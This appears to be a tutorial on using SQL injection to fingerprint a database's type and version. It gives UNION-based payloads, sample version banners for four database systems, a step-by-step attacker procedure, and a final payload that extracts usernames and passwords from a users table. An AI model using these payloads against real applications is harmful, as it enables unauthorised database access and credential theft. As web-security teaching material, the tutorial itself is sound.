## Querying Database Type and Version – Simple Explanation

You need to know what database you're attacking. Different databases respond to different queries.

---

## The Method

Inject version-specific queries until **one works**. The one that doesn't cause an error tells you the database type.

---

## Version Queries by Database

| Database | Query |
|----------|-------|
| **Microsoft SQL Server** | `SELECT @@version` |
| **MySQL** | `SELECT @@version` |
| **Oracle** | `SELECT * FROM v$version` |
| **PostgreSQL** | `SELECT version()` |

---

## Example Attack (UNION method)

Assuming the original query returns **1 column** that accepts strings:

### Payload:
```sql
' UNION SELECT @@version --
```

### If the database is **Microsoft SQL Server**, you see:

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

### If the database is **PostgreSQL**, you see:

```
PostgreSQL 14.5 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 10.3.0-1ubuntu1) 10.3.0, 64-bit
```

### If the database is **MySQL**, you see:

```
8.0.31-0ubuntu0.20.04.1
```

### If the database is **Oracle**, you see:

```
Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production
```

---

## Step-by-Step Hacker Approach

### Step 1: Try MySQL / SQL Server query
```sql
' UNION SELECT @@version --
```
- **If it works** → Database is MySQL or SQL Server
- **If error** → Move to next

### Step 2: Try PostgreSQL query
```sql
' UNION SELECT version() --
```
- **If it works** → Database is PostgreSQL
- **If error** → Move to next

### Step 3: Try Oracle query
```sql
' UNION SELECT banner FROM v$version --
```
- **If it works** → Database is Oracle

---

## What To Do With This Information

Once you know the database type:

| Database | Concatenation | Comment | System tables |
|----------|---------------|---------|---------------|
| PostgreSQL | `\|\|` or `CONCAT()` | `--` | `information_schema` |
| MySQL | `CONCAT()` | `-- ` (space) or `#` | `information_schema` |
| SQL Server | `+` | `--` | `information_schema` |
| Oracle | `\|\|` | `--` | `all_tables` |

---

## Example: Full Attack Flow

```sql
-- Step 1: Find database version
' UNION SELECT version() --

-- Result: PostgreSQL 14.5

-- Step 2: Now I know to use || for concatenation
' UNION SELECT username || '~' || password FROM users --
```

---

## One Sentence Summary

Inject `SELECT @@version`, `SELECT version()`, or `SELECT * FROM v$version` – whichever works tells you exactly which database you're attacking.